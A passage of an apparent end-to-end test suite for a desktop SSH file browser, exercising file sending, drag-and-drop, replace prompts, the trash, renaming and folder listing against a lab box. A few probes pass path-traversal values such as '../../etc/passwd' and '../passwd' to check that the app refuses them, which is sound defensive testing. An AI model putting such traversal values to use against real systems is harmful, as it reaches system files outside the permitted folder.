            })()`);
            await sleep(120);
            await js(front.view, `[...document.querySelectorAll('.fb-menu-one')].find((b) => b.textContent.includes(${JSON.stringify(line)}))?.click()`);
            await sleep(settle);
          };
          // Sending a file from the PC to the box. Which file leaves this PC is answered in the system's own
          // chooser, which no view and no box can answer: the lab answers it in main's place, and the view's
          // part is only naming the folder it is looking at.
          {
            const foot = (): Promise<string> => js<string>(front.view, `(document.getElementById('fb-moving')?.textContent ?? '') + (document.getElementById('fb-foot')?.textContent ?? '')`);
            // Sending is asked for under the right button on the empty part of the folder, which is where it
            // lives now: the glyph button beside the path is gone (his, 2026-11-18 night). The press is on the
            // thing being acted on, which is the folder itself.
            // No settling after this one: what the strip says while several files are going is read straight
            // after the press, and a wait here is time the first of them has already spent moving.
            const askToSend = (): Promise<void> => fromTheFolderMenu('Send a file here', 0);
            const mine = await mkdtemp(path.join(os.tmpdir(), 'berth-send-'));
            const sending = path.join(mine, 'from-the-pc.conf');
            await writeFile(sending, 'a file this PC is sending\n');
            ctx.chooseToSend(() => sending);
            await askToSend();
            const sent = await until(async () => (await foot()).includes('is on the box'), 25_000);
            const said = await foot();
            const landed = await lab.tell('read var/log/from-the-pc.conf');
            check('the send button puts a file from the PC on the box, and the box agrees about it', sent && said.includes('the box holds the same file') && landed['text'] === 'a file this PC is sending\n', [said, landed]);

            // ---- A file dragged in from Windows ----
            //
            // What he does every day, and what MobaXterm does that Berth could not. The page's part is the
            // smallest it can be: it says which folder the drop was over and hands the drop's own files to
            // the preload, which is the only side that may learn where a file lives on this PC (plan B2.7).
            //
            // The crux is what a page can do with that. A File a page builds for itself has no path, so the
            // preload has nothing to send and the page cannot turn a drop into naming a file of its own
            // choosing. That is what is held here, by doing it: a drop of a page's own File, on the real
            // handler, driven through the real port.
            {
              const asksBefore = { ...ctx.filesAsked() };
              const took = await js<number>(front.view, `(() => {
                const made = new File(['not from the system at all'], 'made-up.conf', { type: 'text/plain' });
                return window.tabPort.dropped([made], '/var/log');
              })()`);
              await sleep(400);
              const onTheBox = await lab.tell('read var/log/made-up.conf');
              check('a file a page made for itself has no path, so a drop of it names nothing and sends nothing', took === 0 && onTheBox['error'] === 'no such file' && JSON.stringify(ctx.filesAsked()) === JSON.stringify(asksBefore), [took, onTheBox, ctx.filesAsked(), asksBefore]);
              // And the pane says so, rather than taking a drop that did nothing in silence.
              await js(front.view, `(() => {
                const made = new File(['x'], 'made-up-2.conf');
                const t = new DataTransfer();
                t.items.add(made);
                document.getElementById('files').dispatchEvent(new DragEvent('drop', { bubbles: true, cancelable: true, dataTransfer: t }));
              })()`);
              const saidNothing = await until(async () => (await foot()).includes('nothing to send'), 5000);
              check('a drop of something that is not a file says so, rather than doing nothing in silence', saidNothing, await foot());
              // While a file is over the pane, the pane says it will take it: a drop with nowhere lit up is a
              // drop he has to guess at.
              const lit = await js<string>(front.view, `(() => {
                const t = new DataTransfer();
                t.items.add(new File(['x'], 'over.txt'));
                const pane = document.getElementById('files');
                pane.dispatchEvent(new DragEvent('dragover', { bubbles: true, cancelable: true, dataTransfer: t }));
                const on = pane.dataset.dropping ?? '';
                pane.dispatchEvent(new DragEvent('dragleave', { bubbles: true, cancelable: true, dataTransfer: t }));
                return on + ',' + (pane.dataset.dropping ?? '');
              })()`);
              check('the pane lights up while a file is held over it, and goes quiet when it leaves', lit === 'yes,no', lit);
            }
            // A file already on the box: Berth asks first, with both files in front of the person, and nothing
            // on the box is touched until the answer comes back (BUILD-RULES 2.20).
            await writeFile(sending, 'the second try, which only goes in if he says so\n');
            await askToSend();
            const asked = await until(() => has('#replacing'), 25_000);
            await shot('replace-asks', 'a file already on the box, asked about before anything is replaced', front);
            const bothShown = await text('#replacing-both');
            const titleShown = await text('#replacing-title');
            // The way out takes the focus as the dialog is drawn, which is a moment after it is there: it is
            // waited for rather than sampled, or this probe is about how fast the machine is.
            await until(async () => (await js<string>(ctx.shell, `document.activeElement?.id ?? ''`)) === 'replacing-keep', 5000);
            const focused = await js<string>(ctx.shell, `document.activeElement?.id ?? ''`);
            const untouchedWhileAsking = await lab.tell('read var/log/from-the-pc.conf');
            // While the question is open the pane says the send is waiting on it, and does not say it was
            // refused: a refusal shown beside the question would contradict the thing being asked.
            const stripWhileAsking = await foot();
            check('a file already on the box is asked about, with both files shown, nothing touched, and the pane waiting on the answer', asked && titleShown.includes('from-the-pc.conf') && bothShown.includes('On the box now') && bothShown.includes('Going in its place') && focused === 'replacing-keep' && stripWhileAsking.includes('waiting on your answer') && !stripWhileAsking.includes('A file of that name is already on the box') && untouchedWhileAsking['text'] === 'a file this PC is sending\n', [titleShown, bothShown, focused, stripWhileAsking, untouchedWhileAsking]);
            // Keep what is there: the box is left exactly as it was, and the strip says so.
            await clickOn('#replacing-keep');
            const kept = await until(async () => (await foot()).includes('left as it was'), 10_000);
            const afterKeeping = await lab.tell('read var/log/from-the-pc.conf');
            check('Keep what is there leaves the box exactly as it was, and says so', kept && !(await has('#replacing')) && afterKeeping['text'] === 'a file this PC is sending\n', [await foot(), afterKeeping]);
            // Replace it: the new one goes in, over the old, and the box agrees about what arrived.
            await askToSend();
            await until(() => has('#replacing'), 25_000);
            await clickOn('#replacing-do');
            const over = await until(async () => (await foot()).includes('over the file that was there'), 25_000);
            const afterReplacing = await lab.tell('read var/log/from-the-pc.conf');
            check('Replace it puts the new file in over the old one, and the box agrees about it', over && (await foot()).includes('the box holds the same file') && afterReplacing['text'] === 'the second try, which only goes in if he says so\n', [await foot(), afterReplacing]);
            // The chooser answered with nothing: the window says so and the box is not touched.
            ctx.chooseToSend(() => undefined);
            await askToSend();
            check('a chooser answered with nothing is said, and nothing is sent', await until(async () => (await foot()).includes('No file was chosen'), 10_000), await foot());
            // More than one file chosen in one go. They are sent one at a time, each with a line of its own,
            // and the strip says how many are still waiting. One at a time matters: a box asked for everything
            // at once answers none of it quickly, and the count is what a person reads instead of sixty lines.
            {
              const three = ['first.conf', 'second.conf', 'third.conf'];
              for (const [i, n] of three.entries()) await writeFile(path.join(mine, n), `file number ${i + 1} of a batch\n`.repeat(400));
              ctx.chooseToSend(() => three.map((n) => path.join(mine, n)));
              await lab.tell('filepace 60'); // so each send has a middle long enough to be looked at
              await askToSend();
              // While they go: how many lines are about a transfer still moving (the waiting line is not one
              // of them), and whether the count of what is waiting was ever shown.
              let mostAtOnce = 0;
              let sawWaiting = '';
              const landed = await until(
                async () => {
                  const now = await js<{ moving: number; waiting: string }>(
                    front.view,
                    `(() => { const ones = [...document.querySelectorAll('#fb-moving .fb-moving-one')]; return { moving: ones.filter((e) => e.id !== 'fb-waiting' && e.querySelector('.fb-stop')).length, waiting: document.getElementById('fb-waiting')?.textContent ?? '' }; })()`,
                  );
                  mostAtOnce = Math.max(mostAtOnce, now.moving);
                  if (now.waiting !== '') sawWaiting = now.waiting;
                  const there = await Promise.all(three.map((n) => lab.tell(`read var/log/${n}`)));
                  return there.every((r) => typeof r['text'] === 'string' && (r['text'] as string).startsWith('file number'));
                },
                60_000,
                60,
              );
              await lab.tell('filepace 0');
              const each = await Promise.all(three.map((n) => lab.tell(`read var/log/${n}`)));
              const rightBytes = each.every((r, i) => r['text'] === `file number ${i + 1} of a batch\n`.repeat(400));
              check('three files chosen at once all reach the box, with the right bytes each', landed && rightBytes, [landed, each.map((r) => String(r['text'] ?? r['error']).slice(0, 24))]);
              check('they go one at a time, and the strip says how many are waiting', mostAtOnce === 1 && sawWaiting.includes('waiting to be sent'), [mostAtOnce, sawWaiting]);
              check('nothing is left waiting once they have all gone', ctx.stillToSend(front.id) === 0, ctx.stillToSend(front.id));
              for (const n of three) await lab.tell(`forget var/log/${n}`);
            }
            // What is still waiting can be dropped: the button says what it did, what was moving is left alone
            // to finish, and nothing that was waiting ever reaches the box.
            {
              const six = [0, 1, 2, 3, 4, 5].map((i) => `batch-${i}.conf`);
              // Big enough that one of them takes a while at this pace, or the whole queue would be through
              // before the button could be pressed and this probe would be about nothing.
              for (const n of six) await writeFile(path.join(mine, n), 'one of six\n'.repeat(50_000));
              ctx.chooseToSend(() => six.map((n) => path.join(mine, n)));
              await lab.tell('filepace 120');
              await askToSend();
              const shown = await until(() => has('#fb-waiting-stop', front), 25_000);
              await clickOn('#fb-waiting-stop', front);
              const dropped = await until(async () => (await foot()).includes('will not be sent'), 10_000);
              const said = await foot();
              const holding = ctx.stillToSend(front.id);
              await lab.tell('filepace 0');
              // The first one was already moving when the rest were dropped, so it is allowed to finish; the
              // last one was only ever waiting, so it must never appear on the box at all.
              await until(async () => typeof (await lab.tell('read var/log/batch-0.conf'))['text'] === 'string', 25_000);
              await sleep(500);
              const last = await lab.tell('read var/log/batch-5.conf');
              check('dropping what is waiting says so, holds nothing back, and none of it reaches the box', shown && dropped && said.includes('will not be sent') && holding === 0 && last['text'] === undefined, [shown, said.slice(-120), holding, String(last['text'] ?? last['error']).slice(0, 40)]);
              for (const n of six) await lab.tell(`forget var/log/${n}`);
            }
            // More than one chooser may hand over. The first of them go, and the rest are said rather than
            // quietly dropped: a file a person chose and did not get is never a silent matter.
            {
              const many = Array.from({ length: 66 }, (_, i) => `heap-${String(i).padStart(2, '0')}.conf`);
              for (const n of many) await writeFile(path.join(mine, n), 'one of a heap\n');
              ctx.chooseToSend(() => many.map((n) => path.join(mine, n)));
              await askToSend();
              const toldAbout = await until(() => has('#fb-too-many', front), 20_000);
              const tooMany = await js<string>(front.view, `document.getElementById('fb-too-many')?.textContent ?? ''`);
              const quiet = await until(async () => ctx.stillToSend(front.id) === 0 && (await js<number>(front.view, `[...document.querySelectorAll('#fb-moving .fb-moving-one')].filter((e) => e.id !== 'fb-waiting' && e.querySelector('.fb-stop')).length`)) === 0, 120_000, 200);
              const onTheBox = await Promise.all(many.map((n) => lab.tell(`read var/log/${n}`)));
              const got = onTheBox.filter((r) => typeof r['text'] === 'string').length;
              check('only as many as one send may hold go, and the two over are said and not sent', toldAbout && quiet && got === 64 && tooMany.includes('2 more files were chosen') && tooMany.includes('64 at a time'), [got, tooMany, quiet]);
              for (const n of many) await lab.tell(`forget var/log/${n}`);
            }
            ctx.chooseToSend(null);
            await rm(mine, { recursive: true, force: true });
            await lab.tell('forget var/log/from-the-pc.conf');
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('syslog'), 10_000);
          }
          // Deleting, and the trash it goes into. Nothing is removed on a box: a delete asks first, naming what
          // would go, and then moves it into the trash on that disk, where it can be brought back from.
          {
            const foot = (): Promise<string> => js<string>(front.view, `(document.getElementById('fb-moving')?.textContent ?? '') + (document.getElementById('fb-foot')?.textContent ?? '')`);
            const names = (): Promise<string[]> => js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`);
            await lab.tell('read var/log/syslog');
            // The press asks first, and nothing has moved while it is asking.
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="syslog"] .fb-bye')?.click()`);
            const asked = await until(() => has('#fb-ask-delete', front), 5000);
            const saidWhat = await js<string>(front.view, `document.getElementById('fb-ask-said')?.textContent ?? ''`);
            await until(async () => (await js<string>(front.view, `document.activeElement?.id ?? ''`)) === 'fb-ask-keep', 5000);
            const focused = await js<string>(front.view, `document.activeElement?.id ?? ''`);
            const stillThere = await lab.tell('read var/log/syslog');
            check('a delete asks first, says where it would go and what it is holding, and nothing has moved', asked && saidWhat.includes('trash') && saidWhat.includes('28 B') && focused === 'fb-ask-keep' && typeof stillThere['text'] === 'string', [saidWhat, focused, stillThere]);
            await shot('delete-asks', 'deleting a file on a box, asked about before anything moves', front);
            // Keep it: the file is exactly where it was.
            await js(front.view, `document.getElementById('fb-ask-keep')?.click()`);
            await sleep(200);
            check('Keep it leaves the file where it was', !(await has('#fb-ask-delete', front)) && (await names()).includes('syslog') && typeof (await lab.tell('read var/log/syslog'))['text'] === 'string', await names());
            // Delete it: it leaves the folder and the window says where it went.
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="syslog"] .fb-bye')?.click()`);
            await until(() => has('#fb-ask-delete', front), 5000);
            await js(front.view, `document.getElementById('fb-ask-go')?.click()`);
            const gone = await until(async () => !(await names()).includes('syslog'), 15_000);
            const went = await until(async () => (await foot()).includes('is in the trash'), 15_000);
            const onTheBox = await lab.tell('read var/log/syslog');
            check('Delete it moves the file out of the folder, says so, and the box no longer has it there', gone && went && onTheBox['error'] === 'no such file', [await foot(), onTheBox]);
            // The trash says what is in it, where each came from and when.
            await fromTheFolderMenu('What was deleted here');
            const inBin = await until(async () => (await js<string>(front.view, `document.getElementById('fb-list')?.textContent ?? ''`)).includes('/var/log/syslog'), 15_000);
            const binText = await js<string>(front.view, `document.getElementById('fb-list')?.textContent ?? ''`);
            check('the trash says what has been deleted on this disk, with where it came from and when', inBin && binText.includes('Deleted on this disk') && binText.includes('a moment ago'), binText.slice(0, 160));
            await shot('the-trash', 'what has been deleted on a disk, and the way to put it back', front);
            // The right button inside the trash. The trash draws its rows into the same list, with the same
            // class and the same data-name, so the folder's own menu opened on top of it: Bring it over,
            // Rename, Delete, every line aimed at a name in the folder behind rather than at the thing under
            // the pointer. What is held here is both halves: what the trash offers, and what it must not.
            const menuPutBack = async (): Promise<void> => {
              await js(front.view, `(() => { const r = document.querySelector('#fb-list .fb-row'); const b = r.getBoundingClientRect(); r.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, clientX: Math.round(b.left + 8), clientY: Math.round(b.top + 4) })); })()`);
              await sleep(160);
              await js(front.view, `document.getElementById('fb-menu-back')?.click()`);
            };
            {
              const menuAt = async (what: string): Promise<string[]> => {
                await js(front.view, `(() => { const r = ${what}; const b = r.getBoundingClientRect(); r.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, clientX: Math.round(b.left + 8), clientY: Math.round(b.top + 4) })); })()`);
                await sleep(160);
                return js<string[]>(front.view, `[...document.querySelectorAll('#fb-menu .fb-menu-one .fb-menu-words')].map((w) => w.textContent)`);
              };
              const onRow = await menuAt(`document.querySelector('#fb-list .fb-row')`);
              const folderOnly = ['Bring it over', 'Rename', 'Delete', "The box's own hash", 'New folder', 'Send a file here'];
              check('the right button on something in the trash offers what the trash can do, and none of what the folder behind it can',
                onRow.includes('Put it back where it was') && onRow.includes('Copy where it came from')
                && onRow.some((w) => w.startsWith('Empty what is older than')) && onRow.includes('Back to the folder')
                && !folderOnly.some((w) => onRow.includes(w)), onRow);
              // Nothing in it reaches his shell, which is the standing claim about every menu in this app.
              check('and nothing in the trash\u2019s menu types into his shell', !onRow.some((w) => /terminal|shell|run|open in/i.test(w)), onRow);
              await sweepMenu(front.view, 'the trash, on a row');
              await shot('trash-menu', 'the right button on something in the trash', front);
              await js(front.view, `document.getElementById('fb-menu')?.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }))`);
              // The empty part of the trash is about the trash itself, and says so without naming a thing.
              const onEmpty = await menuAt(`document.getElementById('fb-list')`);
              await sweepMenu(front.view, 'the trash, empty part');
              check('the right button on the empty part of the trash offers only what is about the trash itself',
                !onEmpty.includes('Put it back where it was') && onEmpty.some((w) => w.startsWith('Empty what is older than'))
                && onEmpty.includes('Back to the folder') && !folderOnly.some((w) => onEmpty.includes(w)), onEmpty);
              await js(front.view, `document.getElementById('fb-menu')?.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }))`);
              // The button on the row is still there and still says what it does: the menu is another way to
              // the same thing, never a replacement for the one that was already on screen.
              const stillThere = await js<string>(front.view, `document.querySelector('#fb-list .fb-row .fb-back')?.getAttribute('aria-label') ?? ''`);
              check('and the row keeps its own button, which the menu stands beside rather than replaces', stillThere.startsWith('Put '), stillThere);
            }
            // Put it back, pressed in the menu: the same thing the row's own button does.
            await menuPutBack();
            const back = await until(async () => (await foot()).includes('is back where it was'), 15_000);
            const backOnTheBox = await lab.tell('read var/log/syslog');
            check('Put it back puts the file where it came from, with its own bytes', back && backOnTheBox['text'] === "a line of the box's own log\n", [await foot(), backOnTheBox]);
            // A view may name one thing inside a trash and nothing that could be a path of its own.
            const droppedBefore = ctx.dropped();
            await js(front.view, `(window.tabPort.files({ id: 91001, do: 'restore', path: '/var/log', name: '../../etc/passwd' }), window.tabPort.files({ id: 91002, do: 'restore', path: '/var/log', name: '' }), window.tabPort.files({ id: 91003, do: 'restore', path: '/var/log' }))`);
            await sleep(400);
            check('a view putting something back may name one thing in the trash and nothing path-shaped', ctx.dropped() === droppedBefore + 3, ctx.dropped() - droppedBefore);
            await fromTheFolderMenu('Back to the folder');
            await until(async () => (await names()).includes('syslog'), 15_000);
            // What Berth will not delete is refused, and the box keeps it.
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await names()).includes('log'), 10_000);
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await names()).includes('var'), 10_000);
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="var"] .fb-bye')?.click()`);
            await until(() => has('#fb-ask-delete', front), 5000);
            await js(front.view, `document.getElementById('fb-ask-go')?.click()`);
            const refused = await until(async () => (await foot()).includes('does not delete that'), 15_000);
            check('a folder at the top of the box is refused, and it is still there', refused && (await names()).includes('var'), [await foot(), await names()]);
            // Back to the folder the probes after this one expect.
            await js(front.view, `document.querySelector('[data-name="var"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await names()).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await names()).includes('syslog'), 10_000);
          }
          // Naming things on a box: a new name for what is there, and a new folder. Both are one name typed and
          // one press, and what a box would refuse the window says first (plan B4.1).
          {
            const foot = (): Promise<string> => js<string>(front.view, `(document.getElementById('fb-moving')?.textContent ?? '') + (document.getElementById('fb-foot')?.textContent ?? '')`);
            const names = (): Promise<string[]> => js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`);
            const field = (): Promise<string> => js<string>(front.view, `document.getElementById('fb-name-field')?.value ?? ''`);
            const panelSays = (): Promise<string> => js<string>(front.view, `document.getElementById('fb-name-said')?.textContent ?? ''`);
            const type = (v: string): Promise<unknown> =>
              js(front.view, `(() => { const f = document.getElementById('fb-name-field'); f.value = ${JSON.stringify(v)}; f.dispatchEvent(new Event('input', { bubbles: true })); })()`);

            // F2 on the row the list stands on opens it, with the name in the field and the part before the
            // last dot picked out, which is the part a rename almost always changes.
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="syslog"]')?.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }))`);
            await js(front.view, `document.getElementById('fb-list')?.focus()`);
            await js(front.view, `document.getElementById('fb-list')?.dispatchEvent(new KeyboardEvent('keydown', { key: 'F2', bubbles: true }))`);
            const openedByKey = await until(() => has('#fb-name-field', front), 5000);
            await until(async () => (await js<string>(front.view, `document.activeElement?.id ?? ''`)) === 'fb-name-field', 5000);
            const held = await field();
            const onTheField = await js<string>(front.view, `document.activeElement?.id ?? ''`);
            check('F2 opens the naming panel on the row the list stands on, with that name in the field and the field in hand', openedByKey && held === 'syslog' && onTheField === 'fb-name-field', [openedByKey, held, onTheField]);
            await shot('rename-asks', 'giving something on a box a new name', front);

            // Escape leaves it alone, and the row keeps its name.
            await js(front.view, `document.getElementById('fb-name-field')?.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }))`);
            await sleep(150);
            check('Escape leaves the name as it was', !(await has('#fb-name-field', front)) && (await names()).includes('syslog'), await names());

            // What a box would refuse is refused here, before anything leaves the window: a name holding a
            // slash, an empty one, and a name something in this folder already has.
            const asksBefore = { ...ctx.filesAsked() };
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="syslog"] .fb-rename')?.click()`);
            await until(() => has('#fb-name-field', front), 5000);
            await type('../passwd');
            await js(front.view, `document.getElementById('fb-name-go')?.click()`);
            await sleep(150);
            const slashSaid = await panelSays();
            await type('');
            await js(front.view, `document.getElementById('fb-name-go')?.click()`);
            await sleep(150);
            const emptySaid = await panelSays();
            // The name of something this folder really holds, found from the listing itself rather than
            // guessed: a guess that is not there renames the file instead of being refused.
            const sibling = (await names()).find((n) => n !== '..' && n !== 'syslog') ?? '';
            await type(sibling);
            await js(front.view, `document.getElementById('fb-name-go')?.click()`);
            await sleep(150);
            const takenSaid = await panelSays();
            const askedNothing = JSON.stringify(ctx.filesAsked()) === JSON.stringify(asksBefore);
            check('a name with a slash, an empty one, and one already in this folder are each refused in the window, and the box is asked nothing', sibling !== '' && slashSaid.includes('slash') && emptySaid.includes('Type a name') && takenSaid.includes('already called that') && askedNothing && (await names()).includes('syslog'), [sibling, slashSaid, emptySaid, takenSaid, ctx.filesAsked(), asksBefore]);

            // And a real one: the row is called the new name, the list stands on it, and the box itself has
            // the file under that name with its own bytes and nothing under the old one.
            await type('syslog.kept');
            await js(front.view, `document.getElementById('fb-name-go')?.click()`);
            const renamed = await until(async () => (await names()).includes('syslog.kept'), 15_000);
            const saidSo = await until(async () => (await foot()).includes('is now called'), 15_000);
            // Where the list stands is the tab stop, not what is announced as chosen: those were one thing
            // while one row was all there was, and stopped being one when several became possible.
            const standsOn = await js<string>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].find((r) => r.tabIndex === 0)?.dataset?.name ?? ''`);
            const onTheBox = await lab.tell('read var/log/syslog.kept');
            const oldGone = await lab.tell('read var/log/syslog');
            check('a new name is the name on the box as well: the bytes are under it, nothing is under the old one, and the list stands on it', renamed && saidSo && onTheBox['text'] === "a line of the box's own log\n" && oldGone['error'] === 'no such file' && standsOn === 'syslog.kept' && !(await names()).includes('syslog'), [await foot(), onTheBox, oldGone, standsOn]);

            // Back to the name the probes after this one expect.
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="syslog.kept"] .fb-rename')?.click()`);
            await until(() => has('#fb-name-field', front), 5000);
            await type('syslog');
            await js(front.view, `document.getElementById('fb-name-field')?.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }))`);
            const backAgain = await until(async () => (await names()).includes('syslog'), 15_000);
            check('Enter in the field does it too, and the name is back as it was', backAgain && (await lab.tell('read var/log/syslog'))['text'] === "a line of the box's own log\n", await names());

            // A pane is redrawn whenever anything arrives from the box, and a person naming something is
            // typing into it while that happens. What they have typed, where the caret is and which element
            // holds it all have to survive a redraw, or a name ends up half typed into the middle of itself.
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="syslog"] .fb-rename')?.click()`);
            await until(() => has('#fb-name-field', front), 5000);
            await type('half-typed');
            await js(front.view, `(() => { const f = document.getElementById('fb-name-field'); f.focus(); f.setSelectionRange(4, 4); })()`);
            // The redraw is made to happen by a press that redraws the whole pane and asks the box for
            // nothing: ordering the list another way. That it really happened is proved by the order itself
            // changing, so this probe cannot pass by nothing having been drawn at all.
            const orderWas = (await names()).join();
            await clickOn('#fb-by-size', front);
            await until(async () => (await names()).join() !== orderWas, 5000);
            const orderNow = (await names()).join();
            await clickOn('#fb-by-name', front);
            await sleep(200);
            const kept = await field();
            const caret = await js<number>(front.view, `document.getElementById('fb-name-field')?.selectionStart ?? -1`);
            const stillOnIt = await js<string>(front.view, `document.activeElement?.id ?? ''`);
            // The press that caused the redraw was on a column head, so the keyboard belongs on that head
            // afterwards and nowhere else. It must not have been dragged onto a row: the pane settles its
            // tab stop on every draw, and a draw that thinks the rows held the keyboard takes it off
            // whatever really had it, which is how a person loses the field they are typing a name into.
            check('a redraw while a name is being typed keeps the letters and the caret where they were, and the keyboard stays on what was pressed', kept === 'half-typed' && caret === 4 && stillOnIt === 'fb-by-name' && orderNow !== orderWas, [kept, caret, stillOnIt, orderWas === orderNow]);
            await js(front.view, `document.getElementById('fb-name-drop')?.click()`);
            await sleep(150);

            // A new folder: it is in the list, and the box itself has a folder there.
            await fromTheFolderMenu('New folder');
            await until(() => has('#fb-name-field', front), 5000);
            const emptyToStart = await field();
            await type('kept logs');
            await js(front.view, `document.getElementById('fb-name-go')?.click()`);
            const made = await until(async () => (await names()).includes('kept logs'), 15_000);
            const boxHasIt = await lab.tell('look var/log/kept logs');
            const madeSaid = await foot();
            check('a new folder is made where it was asked for, and it is a folder on the box', made && emptyToStart === '' && boxHasIt['kind'] === 'folder' && madeSaid.includes('made'), [made, emptyToStart, boxHasIt, madeSaid]);
            await shot('new-folder', 'a folder made on a box from the window', front);

            // The same name again is refused, and by the box's own answer and not only by the window: the
            // window is made to ask for it, so what comes back is the box's.
            const beforeTaken = ctx.filesAsked()['folder'] ?? 0;
            await js(front.view, `window.tabPort.files({ id: 92001, do: 'folder', path: '/var/log', name: 'kept logs' })`);
            await sleep(600);
            const stillOne = (await names()).filter((n) => n === 'kept logs').length;
            check('the box refuses a folder whose name is taken, and the one that is there is left alone', (ctx.filesAsked()['folder'] ?? 0) === beforeTaken + 1 && stillOne === 1 && (await lab.tell('look var/log/kept logs'))['kind'] === 'folder', [ctx.filesAsked()['folder'], beforeTaken, stillOne]);

            // A view may name one name and nothing path-shaped, for either ask: main drops the rest.
            const droppedBefore = ctx.dropped();
            await js(front.view, `(window.tabPort.files({ id: 92010, do: 'rename', path: '/var/log/syslog', name: '../passwd' }), window.tabPort.files({ id: 92011, do: 'rename', path: '/var/log/syslog', name: '' }), window.tabPort.files({ id: 92012, do: 'rename', path: '/var/log/syslog' }), window.tabPort.files({ id: 92013, do: 'folder', path: '/var/log', name: 'a/b' }), window.tabPort.files({ id: 92014, do: 'folder', path: '/var/log', name: '..' }))`);
            await sleep(400);
            const stillThere = await lab.tell('read var/log/syslog');
            check('a view naming a path, or nothing at all, is dropped by main for both asks', ctx.dropped() === droppedBefore + 5 && typeof stillThere['text'] === 'string' && (await lab.tell('look var/passwd'))['error'] === 'no such file', [ctx.dropped() - droppedBefore, stillThere]);
          }
          // A box that says no to the file subsystem the first time it is asked. A real box does, when it is
          // busy or when the link is barely up. One refusal used to leave that tab's browser dead for as long
          // as the tab lived, with nothing a person could do but close it: the engine asked once and never
          // again. Now the window says it is trying and asks again, and the folder arrives.
          {
            const refusing = await lab.tell('nofiles 1');
            check('the lab box is set to refuse the file subsystem once', refusing['refusing'] === 1, refusing);
            const later = ctx.openTab(front.box!.id, 'logs')!;
            await until(() => later.engine.link.phase === 'up', 25_000);
            const saidTrying = await until(async () => (await js<string>(later.view, `document.getElementById('fb-list')?.textContent ?? ''`)).includes('Trying again'), 20_000);
            const cameBack = await until(async () => (await js<number>(later.view, `document.querySelectorAll('#fb-list .fb-row').length`)) > 0, 20_000);
            const itsFolder = await js<string>(later.view, `document.querySelector('.fb-path')?.textContent ?? ''`);
            ctx.closeTab(later.id);
            await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${front.id} })`);
            await until(() => ctx.shellState().active === front.id, 3000);
            check('a box that says no to the file subsystem once is asked again, and the folder arrives', saidTrying && cameBack && itsFolder.endsWith('/var/log'), [saidTrying, cameBack, itsFolder]);
          }
          // A folder with thousands of things in it, left part-read: moving away must abandon it, and its
          // pages, still arriving, must not be drawn over the folder now on screen. Without that, a person
          // moving quickly ends up looking at a folder they have already left.
          {
            const said = await lab.tell('manyfiles /var/log/many 1200');
            check('the lab made a folder with many things in it', said['made'] === 1200, said);
            // The box is made to answer each page of a listing slowly, so this folder is still arriving while
            // the person moves away from it: that is the moment this is about, and a fast box never shows it.
            await lab.tell('filepace 120');
            // The folder was made after this one was listed, and nothing redraws by itself, so the folder is
            // read again before the new one can be gone into.
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('many'), 10_000);
            await js(front.view, `document.querySelector('[data-name="many"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            // Away again as soon as the first rows are there, with the rest still coming.
            const began = await until(async () => (await js<number>(front.view, `document.querySelectorAll('#fb-list .fb-row').length`)) > 50, 20_000);
            const stillReading = (await js<string>(front.view, `document.getElementById('fb-foot')?.textContent ?? ''`)).includes('reading');
            check('a big folder is drawn as it arrives, not held back until it is whole', began && stillReading, [began, stillReading]);
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            const backUp = await until(async () => (await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`)).endsWith('/var/log'), 15_000);
            // Long enough that every page of the folder left behind would have arrived by now.
            await sleep(2500);
            const names = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`);
            const foot = await js<string>(front.view, `document.getElementById('fb-foot')?.textContent ?? ''`);
            check('a folder left part-read is abandoned, and its late pages are never drawn over the next one', began && backUp && !names.some((n) => n.startsWith('thing-')) && names.includes('syslog') && !foot.includes('reading'), [names.slice(0, 8), foot]);
